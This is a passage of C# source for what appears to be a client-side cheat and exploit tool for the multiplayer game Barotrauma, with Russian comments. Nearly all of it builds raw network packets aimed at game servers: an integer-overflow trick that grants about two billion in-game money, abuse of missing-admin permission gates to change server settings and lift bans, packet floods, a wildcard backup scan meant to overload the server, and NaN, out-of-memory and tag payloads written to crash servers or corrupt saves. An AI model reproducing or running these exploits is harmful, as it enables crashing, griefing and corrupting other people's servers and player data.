            if (!CanSend()) { return "нет подключения"; }
            if (!InRound()) { return "нужно быть в раунде (кошелёк персонажа)"; }
            if (GameMain.GameSession?.Campaign == null) { return "нужна кампания"; }

            int cycles = Math.Max(1, Math.Min(n, 3));   // rate limit 20/5с: 12 запросов/цикл
            for (int c = 0; c < cycles; c++)
            {
                for (int p = 0; p < 11; p++)
                {
                    SendClinicAddPending(3000, 90000 + c * 11 + p);
                }
                SendClinicHealPacket();
            }
            string note = cycles > 1 ? " (остальные циклы упрутся в rate limit — жди 5с)" : "";
            return "Полный цикл ×" + cycles + ": 11×ADD + HEAL. Баланс += ~2.13B за цикл" + note;
        }

        private static string ExecClinicGiant(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            if (!InRound()) { return "нужно быть в раунде (кошелёк персонажа)"; }
            if (GameMain.GameSession?.Campaign == null) { return "нужна кампания"; }

            int perPacket = 33000;
            var afflictions = new MedicalClinic.NetAffliction[perPacket];
            for (int i = 0; i < perPacket; i++)
            {
                afflictions[i] = new MedicalClinic.NetAffliction
                {
                    Identifier = "zzz_clinic_overflow".ToIdentifier(),
                    Strength = 0,
                    VitalityDecrease = 0,
                    Price = 65535
                };
            }
            var member = new MedicalClinic.NetCrewMember
            {
                CharacterInfoID = 90000,
                Afflictions = ImmutableArray.Create(afflictions)
            };
            IWriteMessage msg = new WriteOnlyMessage().WithHeader(ClientPacketHeader.MEDICAL);
            msg.WriteByte(ClinicHeaderAddPending);
            ((INetSerializableStruct)member).Write(msg);
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return "Гигант ADD_PENDING отправлен (~400KB). HEAL через 2-3 секунды! Если тишина — юзай 11 лёгких.";
        }

        private static string ExecClinicHeal(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            if (!InRound()) { return "нужно быть в раунде"; }
            for (int i = 0; i < Math.Min(n, 5); i++)
            {
                SendClinicHealPacket();
            }
            return "HEAL отправлен. Если очередь ≥32770 × 65535 — баланс += ~2.1B. НЕ в бою на аутпосте!";
        }

        // ОПТИМАЛЬНЫЙ цикл: сумма ровно 2^31 → int.MinValue → +2,147,483,648
        private static string ExecClinicOptimal(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            if (!InRound()) { return "нужно быть в раунде (кошелёк персонажа)"; }
            if (GameMain.GameSession?.Campaign == null) { return "нужна кампания"; }

            int cycles = Math.Max(1, Math.Min(n, 3));
            for (int c = 0; c < cycles; c++)
            {
                SendClinicAddPending(32770, 90000 + c * 10);        // 32770 × 65535
                SendClinicAddPending(1, 90001 + c * 10, 2048);      // + 2048 = ровно 2^31
                SendClinicHealPacket();
            }
            return "ОПТИМАЛЬНЫЙ цикл ×" + cycles + ": +" + (2147483648L * cycles) + " mk (теоретический максимум)";
        }

        // 💊 FREE HEAL: свои реальные раны с Price=0 — малые пакеты, без оверфлоу
        private static string ExecClinicFreeHeal(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
            if (GameMain.GameSession?.Campaign == null) { return "нужна кампания"; }

            Character me = Character.Controlled;
            int infoId = 0;
            try { infoId = me.Info.ID; } catch { }
            if (infoId == 0) { return "нет CharacterInfo"; }

            var seen = new HashSet<Identifier>();
            var list = new List<MedicalClinic.NetAffliction>();
            try
            {
                foreach (Affliction aff in me.CharacterHealth.GetAllAfflictions())
                {
                    if (aff == null || aff.Prefab == null) { continue; }
                    if (!seen.Add(aff.Identifier)) { continue; }
                    list.Add(new MedicalClinic.NetAffliction
                    {
                        Identifier = aff.Identifier,
                        Strength = (ushort)Math.Ceiling(aff.Strength),
                        VitalityDecrease = 0,
                        Price = 0
                    });
                }
            }
            catch (Exception e) { return "afflictions fail: " + e.Message; }
            if (list.Count == 0) { return "ран нет — лечить нечего"; }

            var member = new MedicalClinic.NetCrewMember
            {
                CharacterInfoID = infoId,
                Afflictions = ImmutableArray.Create(list.ToArray())
            };
            IWriteMessage add = new WriteOnlyMessage().WithHeader(ClientPacketHeader.MEDICAL);
            add.WriteByte(ClinicHeaderAddPending);
            ((INetSerializableStruct)member).Write(add);
            GameMain.Client.ClientPeer.Send(add, DeliveryMethod.Reliable);

            SendClinicHealPacket();
            return "FREE HEAL: " + list.Count + " ран с Price=0 — вылечен за 0 mk";
        }

        // ========================================================
        //  🎁 ПЕРКИ (волна 604): SERVER_SETTINGS_PERKS
        //  Гейт HasPermissionToChangePerks: перм ManageSettings, ИЛИ
        //  в PvP — никто твоей команды не админ, ИЛИ вообще никто не админ.
        //  Формат ReadPerks: VariableUInt32 count + uint32 id × count (x2 команд).
        // ========================================================
        private static uint? FindPerkId(string namePart)
        {
            try
            {
                foreach (DisembarkPerkPrefab p in DisembarkPerkPrefab.Prefabs)
                {
                    if (p == null) { continue; }
                    // ищем по идентификатору (lowercase contains)
                    if (p.Identifier.Value.IndexOf(namePart, StringComparison.OrdinalIgnoreCase) >= 0)
                    {
                        return p.UintIdentifier;
                    }
                }
            }
            catch { }
            return null;
        }

        private static string WritePerkSets(List<uint> team1, List<uint> team2)
        {
            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.SERVER_SETTINGS_PERKS);
            msg.WriteVariableUInt32((uint)team1.Count);
            foreach (uint id in team1) { msg.WriteUInt32(id); }
            msg.WriteVariableUInt32((uint)team2.Count);
            foreach (uint id in team2) { msg.WriteUInt32(id); }
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return "перк-пакет отправлен (T1=" + team1.Count + ", T2=" + team2.Count + ")";
        }

        private static string ExecPerkMaxStack(int n)
        {
            if (!CanSend()) { return "нет подключения"; }

            var t1 = new List<uint>();
            var t2 = new List<uint>();
            int filled = 0;
            // жадно набиваем 7 очков известными полезными перками
            foreach (string hint in new[] { "talentpoint", "spawn", "upgrade", "sub", "item", "weapon", "supply" })
            {
                uint? id = FindPerkId(hint);
                if (id.HasValue && !t1.Contains(id.Value)) { t1.Add(id.Value); t2.Add(id.Value); filled++; }
                if (filled >= 5) { break; }
            }
            // добиваем любыми найденными
            if (filled < 5)
            {
                try
                {
                    foreach (DisembarkPerkPrefab p in DisembarkPerkPrefab.Prefabs)
                    {
                        if (p == null || t1.Contains(p.UintIdentifier)) { continue; }
                        t1.Add(p.UintIdentifier); t2.Add(p.UintIdentifier);
                        filled++;
                        if (filled >= 5) { break; }
                    }
                }
                catch { }
            }
            WritePerkSets(t1, t2);
            return "MAX-стак перков: " + filled + " шт в обе команды (действует на след. старт). Гейт: никто не админ.";
        }

        private static string ExecPerkClear(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            return WritePerkSets(new List<uint>(), new List<uint>()) + " — перки очищены";
        }

        // ========================================================
        //  🎁 EXTRA CARGO: SERVER_SETTINGS(Properties)
        //  Формат: byte flags, VariableUInt32 count, per item: Identifier + byte amount,
        //  byte monsterChanged+pad, BanList-хвост (пустой: 0 → false)
        //  Упрощение: шлём только cargo-часть — сервер читает последовательно.
        // ========================================================
        private static string ExecExtraCargo(int n)
        {
            if (!CanSend()) { return "нет подключения"; }

            string[] items =
            {
                "assaultrifle", "shotgun", "revolver", "harpoon", "smg",
                "fulgurium", "thermobaric", "oxygen-tank", "welding-fuel", "opium"
            };
            var cargo = new List<(string id, byte amount)>();
            foreach (string it in items) { cargo.Add((it, 10)); }

            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.SERVER_SETTINGS);
            msg.WriteByte((byte)1);                       // NetFlags.Properties
            msg.WriteVariableUInt32((uint)cargo.Count);
            foreach (var (id, amount) in cargo)
            {
                msg.WriteIdentifier(id.ToIdentifier());
                msg.WriteByte(amount);
            }
            msg.WriteUInt32(0);                           // net properties count = 0
            msg.WriteBoolean(false); msg.WritePadBits();  // monster settings
            msg.WriteVariableUInt32(0);                   // BanList: пусто

            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return "EXTRA CARGO: " + cargo.Count + " типов × 10 спавнится при каждом старте (гейт: никто не админ)";
        }

        private static string ExecLevelSeed(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.SERVER_SETTINGS);
            msg.WriteByte((byte)6);                       // NetFlags.Misc | NetFlags.LevelSeed (2|4)
            msg.WriteIdentifier("monster".ToIdentifier()); // added mission type
            msg.WriteIdentifier(Identifier.Empty);         // removed mission type
            msg.WriteByte(1);                              // TraitorDanger +0
            msg.WriteString("666");                        // LevelSeed = баг-сид
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return "LEVEL SEED = 666 задан (след. уровень с баг-сідом). Гейт: никто не админ.";
        }

        // ========================================================
        //  🎁 UNBAN (BanList.ServerAdminRead, волна 605):
        //  гейт Бан-перм — на permless-сервере он есть у всех через
        //  AnyOneAllowed (не для HasPermission! это разные гейты).
        //  Формат: SERVER_SETTINGS Properties + VariableUInt32 removeCount
        //  + uint32 UniqueIdentifier × count
        // ========================================================
        private static string ExecUnbanSpam(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            int count = Math.Min(Math.Max(n, 1), 200);
            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.SERVER_SETTINGS);
            msg.WriteByte((byte)4);              // NetFlags.Properties
            msg.WriteVariableUInt32(0);          // ExtraCargo count
            msg.WriteUInt32(0);                  // net props count
            msg.WriteBoolean(false); msg.WritePadBits();
            msg.WriteVariableUInt32((uint)count);
            for (uint i = 0; i < count; i++) { msg.WriteUInt32(i + 1); }
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return "Unban-sweep ×" + count + " (нужен перм Ban; снимает баны по порядочным ID 1.." + count + ")";
        }

        // ========================================================
        //  🎪 TRAITOR DANGER MAX (Misc-flag байт-дельта)
        //  Сервер: TraitorDangerLevel = TraitorDangerLevel + ReadByte() - 1
        //  byte 0 = -1, byte 1 = +0, byte 2 = +1, byte 255 = +254 (clamp max)
        // ========================================================
        private static string ExecTraitorMax(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            int sent = 0;
            for (int i = 0; i < Math.Min(n, 10); i++)
            {
                IWriteMessage msg = new WriteOnlyMessage();
                msg.WriteByte((byte)ClientPacketHeader.SERVER_SETTINGS);
                msg.WriteByte((byte)8);                          // NetFlags.Misc
                msg.WriteIdentifier(Identifier.Empty);           // addedMissionType
                msg.WriteIdentifier(Identifier.Empty);           // removedMissionType
                msg.WriteByte(255);                              // +254 → clamp до MaxDangerLevel=3
                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
                sent++;
            }
            return "TRAITOR DANGER → MAX (3) ×" + sent + " (гейт: никто не админ)";
        }

        private static string ExecMissionType(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            string[] types = { "monster", "husk", "bandit", "cargo", "ruins" };
            int sent = 0;
            for (int i = 0; i < Math.Min(n, types.Length); i++)
            {
                IWriteMessage msg = new WriteOnlyMessage();
                msg.WriteByte((byte)ClientPacketHeader.SERVER_SETTINGS);
                msg.WriteByte((byte)8);                          // NetFlags.Misc
                msg.WriteIdentifier(types[i].ToIdentifier());    // addedMissionType
                msg.WriteIdentifier(Identifier.Empty);           // removedMissionType
                msg.WriteByte(1);                                // TraitorDanger +0
                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
                sent++;
            }
            return "Mission types добавлены: " + sent + " шт (тёмные/убранные миссии активны)";
        }

        private static string ExecSegmentTable(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            int sent = 0;
            for (int i = 0; i < Math.Min(n, 1000); i++)
            {
                IWriteMessage msg = new WriteOnlyMessage();
                msg.WriteByte((byte)ClientPacketHeader.UPDATE_LOBBY);
                msg.WriteInt32(int.MaxValue);
                msg.WriteUInt16(0);
                msg.WriteUInt16(0);
                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
                sent++;
            }
            return "SegmentTable ×" + sent;
        }

        private static string ExecSoldPrefab(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            if (GameMain.GameSession?.Campaign == null) { return "нужна кампания"; }
            int sent = 0;
            for (int i = 0; i < Math.Min(n, 500); i++)
            {
                IWriteMessage msg = new WriteOnlyMessage();
                msg.WriteByte((byte)ClientPacketHeader.SERVER_COMMAND);
                msg.WriteUInt16((ushort)ClientPermissions.ManageCampaign);
                ushort loc = CurrentLocIndex();
                msg.WriteUInt16(loc);
                msg.WriteUInt16(loc);
                msg.WriteByte(0);
                msg.WriteBoolean(false);
                msg.WriteBoolean(false);
                msg.WriteBoolean(false);
                msg.WriteByte(0);
                msg.WriteByte(0);
                msg.WriteByte(0);
                msg.WriteByte(1);
                msg.WriteIdentifier("a".ToIdentifier());
                msg.WriteUInt16(1);
                msg.WriteIdentifier("zzz_nonexistent_prefab".ToIdentifier());
                msg.WriteUInt16(0);
                msg.WriteBoolean(false);
                msg.WriteByte(0);
                msg.WriteByte(0);
                msg.WriteUInt16(0);
                msg.WriteUInt16(0);
                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
                sent++;
            }
            return "SoldItems ×" + sent;
        }

        private static string ExecCircuitBox(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            for (int i = 0; i < Math.Min(n, 500); i++)
            {
                IWriteMessage msg = new WriteOnlyMessage();
                msg.WriteByte((byte)ClientPacketHeader.CIRCUITBOX);
                INetSerializableStruct header = new NetCircuitBoxHeader((CircuitBoxOpcode)2, 1, 0);
                header.Write(msg);
                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            }
            return "CircuitBox opcode ×" + Math.Min(n, 500);
        }

        private static string ExecChatOrder(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            int typeMax = Enum.GetValues(typeof(ChatMessageType)).Length - 1;
            int modeMax = Enum.GetValues(typeof(ChatMode)).Length - 1;
            int sent = 0;
            for (int i = 0; i < Math.Min(n, 1000); i++)
            {
                IWriteMessage msg = new WriteOnlyMessage();
                msg.WriteByte((byte)ClientPacketHeader.UPDATE_LOBBY);
                using (var segmentTable = SegmentTableWriter<ClientNetSegment>.StartWriting(msg))
                {
                    segmentTable.StartNewSegment(ClientNetSegment.ChatMessage);
                    msg.WriteUInt16((ushort)(i + 1));
                    msg.WriteRangedInteger((int)ChatMessageType.Order, 0, typeMax);
                    msg.WriteRangedInteger((int)ChatMode.None, 0, modeMax);
                    msg.WriteIdentifier("zzz_nonexistent_order".ToIdentifier());
                    msg.WriteUInt16(0);
                    msg.WriteUInt16(0);
                    msg.WriteByte(0);
                }
                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
                sent++;
            }
            return "ORDER ×" + sent;
        }

        private static string ExecCharInput(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
            int sent = 0;
            for (int i = 0; i < Math.Min(n, 500); i++)
            {
                IWriteMessage msg = new WriteOnlyMessage();
                msg.WriteByte((byte)ClientPacketHeader.UPDATE_INGAME);
                msg.WriteBoolean(true);
                msg.WritePadBits();
                using (var segmentTable = SegmentTableWriter<ClientNetSegment>.StartWriting(msg))
                {
                    segmentTable.StartNewSegment(ClientNetSegment.CharacterInput);
                    msg.WriteUInt16((ushort)(i + 1));
                    msg.WriteByte(255);
                }
                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
                sent++;
            }
            return "Input ×" + sent;
        }

        private static string ExecVoip(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            byte mySession = 0;
            try { mySession = GameMain.Client.SessionId; } catch { }
            int sent = 0;
            for (int i = 0; i < Math.Min(n, 1000); i++)
            {
                IWriteMessage msg = new WriteOnlyMessage();
                msg.WriteByte((byte)ClientPacketHeader.VOICE);
                msg.WriteByte(mySession);
                for (int j = 0; j < 8; j++) { msg.WriteByte(255); }
                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Unreliable);
                sent++;
            }
            return "VOIP ×" + sent;
        }

        // FIX: целься в папку сейвов с wildcard — сервер парсит каждый найденный бэкап
        private static string ExecBackupScan(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            string[] targets =
            {
                "Saves/Multiplayer/*",
                "Saves/*",
                "Multiplayer/*",
                "*"
            };
            int sent = 0;
            for (int round = 0; round < Math.Min(n, 100); round++)
            {
                foreach (string t in targets)
                {
                    IWriteMessage msg = new WriteOnlyMessage();
                    msg.WriteByte((byte)ClientPacketHeader.REQUEST_BACKUP_INDICES);
                    msg.WriteString(t);
                    GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
                    sent++;
                }
            }
            return "Скан ×" + sent + " (папки сейвов: сервер декомпрессит каждый бэкап!)";
        }

        private static string ExecDescriptionTag(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
            Character me = Character.Controlled;
            int done = 0;
            var tried = new HashSet<ushort>();
            foreach (Item it in me.HeldItems) { if (TryTag(it, tried)) { done++; } }
            if (me.Inventory != null)
            {
                foreach (Item it in me.Inventory.AllItemsMod) { if (TryTag(it, tried)) { done++; } }
            }
            if (done == 0)
            {
                Item near = null; float bd = 300f;
                foreach (Item it in Item.ItemList)
                {
                    if (it == null || it.Removed || tried.Contains(it.ID)) { continue; }
                    float d = Vector2.Distance(it.WorldPosition, me.WorldPosition);
                    if (d < bd) { bd = d; near = it; }
                }
                if (near != null && TryTag(near, tried)) { done++; }
            }
            return done > 0
                ? "DescriptionTag на " + done + " предметах — сервер должен умереть"
                : "доступный предмет не найден";
        }

        private static bool TryTag(Item it, HashSet<ushort> tried)
        {
            if (it == null || it.Removed || !tried.Add(it.ID)) { return false; }
            try
            {
                it.DescriptionTag = "zzz_crash_tag_test";
                return true;
            }
            catch { return false; }
        }

        private static string ExecDescriptionTagRaw(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
            Character me = Character.Controlled;
            Item target = null;
            foreach (Item it in me.HeldItems) { if (it != null && !it.Removed) { target = it; break; } }
            if (target == null && me.Inventory != null)
            {
                foreach (Item it in me.Inventory.AllItemsMod) { if (it != null && !it.Removed) { target = it; break; } }
            }
            if (target == null) { return "предмет не найден"; }

            IWriteMessage payload = new WriteOnlyMessage();
            payload.WriteRangedInteger(3, 0, 12);
            payload.WriteIdentifier("DescriptionTag".ToIdentifier());
            payload.WriteString("zzz_crash_tag_raw");
            SendSweep(target.ID, payload, Math.Min(Math.Max(n, 1), 40));
            return "raw ChangeProperty sweep на " + target.Name;
        }

        private static string ExecEventManager(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            for (int i = 0; i < Math.Min(n, 50); i++)
            {
                IWriteMessage msg = new WriteOnlyMessage();
                msg.WriteByte((byte)ClientPacketHeader.EVENTMANAGER_RESPONSE);
                msg.WriteUInt16(0x7FFF);
                msg.WriteByte(200);
                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            }
            return "EVENTMANAGER ×" + Math.Min(n, 50) + " (нужен активный диалог)";
        }

        private static string ExecLabelFlood(int n)
        {
            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
            Item item = SelectedOrNearestCircuitBox(out CircuitBox cb);
            if (item == null || cb == null) { return "нет circuit box (открой ЦБ!)"; }
            int created = 0;
            var rand = new Random();
            n = Math.Min(n, 10000);
            for (int i = 0; i < n; i++)
            {
                try
                {
                    cb.AddLabel(new Vector2(rand.Next(-5000, 5000), rand.Next(-5000, 5000)));
                    created++;
                }
                catch { break; }
            }
            return "LABEL FLOOD: " + created + " на «" + item.Name + "» (персист в сейв!)";
        }

        private static string ExecRenameChaos(int n)
        {
            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
            Item item = SelectedOrNearestCircuitBox(out CircuitBox cb);
            if (item == null || cb == null) { return "нет circuit box (открой ЦБ!)"; }
            int renamed = 0;
            try
            {
                int i = 0;
                foreach (CircuitBoxLabelNode label in cb.Labels)
                {
                    if (label == null) { continue; }
                    i++;
                    try
                    {
                        cb.RenameLabel(label, new Color(255, 0, 0, 255),
                            new NetLimitedString("HACKED#" + i),
                            new NetLimitedString("System compromised!"));
                        renamed++;
                        if (renamed >= n) { break; }
                    }
                    catch { }
                }
            }
            catch (Exception e) { return "rename fail: " + e.Message; }
            return "RENAME: " + renamed + " меток";
        }

        private static string ExecWireChaos(int n)
        {
            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
            Item item = SelectedOrNearestCircuitBox(out CircuitBox cb);
            if (item == null || cb == null) { return "нет circuit box (открой ЦБ!)"; }
            int created = 0;
            int cap = Math.Min(n, 2000);
            try
            {
                for (int i = 0; i < cb.Inputs.Length && created < cap; i++)
                {
                    for (int j = 0; j < cb.Outputs.Length && created < cap; j++)
                    {
                        try
                        {
                            cb.AddWire(cb.Inputs[i], cb.Outputs[j]);
                            created++;
                        }
                        catch { }
                    }
                }
            }
            catch (Exception e) { return "wire fail: " + e.Message; }
            return "WIRE: " + created + " проводов (персист!)";
        }

        private static string ExecEntityStateOom(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
            ushort myId = Character.Controlled.ID;
            int cnt = Math.Min(n, 255);

            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.UPDATE_INGAME);
            msg.WriteBoolean(true);
            msg.WritePadBits();
            using (var segmentTable = SegmentTableWriter<ClientNetSegment>.StartWriting(msg))
            {
                segmentTable.StartNewSegment(ClientNetSegment.EntityState);
                msg.WritePadBits();
                msg.WriteUInt16(RealNextEventId());
                msg.WriteByte((byte)cnt);
                for (int i = 0; i < cnt; i++)
                {
                    msg.WriteUInt16(myId);
                    msg.WriteVariableUInt32(0x40000000u);
                    msg.WriteUInt16(0);
                }
            }
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return "OOM ×" + cnt + " (эксперимент: окно ID ненадёжно)";
        }

        private static string ExecInventoryOob(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
            Character me = Character.Controlled;
            Item container = null; float bd = 400f;
            foreach (Item it in Item.ItemList)
            {
                if (it == null || it.Removed) { continue; }
                bool isC = false;
                try { isC = it.GetComponent<ItemContainer>() != null; } catch { }
                if (!isC) { continue; }
                float d = Vector2.Distance(it.WorldPosition, me.WorldPosition);
                if (d < bd) { bd = d; container = it; }
            }
            if (container == null) { return "рядом нет контейнера"; }

            IWriteMessage payload = new WriteOnlyMessage();
            payload.WriteRangedInteger(1, 0, 12);
            int comps = 1;
            try { comps = Math.Max(1, container.Components.Count); } catch { }
            payload.WriteRangedInteger(0, 0, comps - 1);
            payload.WriteByte(0);
            payload.WriteByte(255);
            for (int i = 0; i < 96; i++) { payload.WriteByte(0); }

            SendSweep(container.ID, payload, Math.Min(Math.Max(n, 1), 40));
            return "Inventory на «" + container.Name + "» (эксперимент)";
        }

        private static string ExecCircuitBoxNaN(int n)
        {
            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
            Item item = SelectedOrNearestCircuitBox(out CircuitBox cb);
            if (item == null || cb == null) { return "нет circuit box"; }
            var ids = new List<ushort>();
            try
            {
                foreach (CircuitBoxComponent comp in cb.Components)
                {
                    if (comp != null && comp.ID != ICircuitBoxIdentifiable.NullComponentID) { ids.Add(comp.ID); }
                }
            }
            catch { }
            if (ids.Count == 0) { return "в цепи нет компонентов"; }

            int cbIndex = 0;
            try
            {
                for (int i = 0; i < item.Components.Count; i++)
                {
                    if (item.Components[i] is CircuitBox) { cbIndex = i; break; }
                }
            }
            catch { }

            IWriteMessage payload = new WriteOnlyMessage();
            payload.WriteRangedInteger(0, 0, 12);
            int comps = Math.Max(1, item.Components.Count);
            payload.WriteRangedInteger(cbIndex, 0, comps - 1);
            payload.WriteByte((byte)CircuitBoxOpcode.MoveComponent);
            CircuitBoxMoveComponentEvent move = new CircuitBoxMoveComponentEvent(
                ImmutableArray.Create<ushort>(ids.ToArray()),
                ImmutableArray.Create<CircuitBoxInputOutputNode.Type>(),
                ImmutableArray.Create<ushort>(ids.ToArray()),
                new Vector2(float.NaN, float.NaN));
            ((INetSerializableStruct)move).Write(payload);

            SendSweep(item.ID, payload, Math.Min(Math.Max(n, 1), 40));
            return "NaN ×" + ids.Count + " узлов ★ СЕЙВ!";
        }

        private static string ExecSelectMode(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.SERVER_COMMAND);
            msg.WriteUInt16((ushort)ClientPermissions.SelectMode);
            msg.WriteUInt16(9999);
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return "SelectMode 9999 (нужен перм)";
        }

        private static string ExecLoadGarbage(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.CAMPAIGN_SETUP_INFO);
            msg.WriteBoolean(false);
            msg.WritePadBits();
            msg.WriteString("C:\\zzz_garbage_nonexistent.save");
            msg.WriteBoolean(false);
            msg.WritePadBits();
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return "LoadCampaign мусор (нужно окно 586/соло)";
        }

        private static string ExecForceSave(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.SERVER_COMMAND);
            msg.WriteUInt16((ushort)ClientPermissions.ManageRound);
            msg.WriteBoolean(true);
            msg.WriteBoolean(true);
            msg.WriteBoolean(false);
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return "Сейв отправлен — порча зафиксирована (аутпост +ManageRound/окно)";
        }

        private static void CloseWindow()
        {
            try { _window?.Close(); } catch { }
            _window = null;
            _list = null;
            _desc = null;
            _noteBox = null;
            _repeatBox = null;
            _selectedMethod = null;
        }

        public override void Dispose()
        {
            CloseWindow();
            base.Dispose();
        }
    }
}
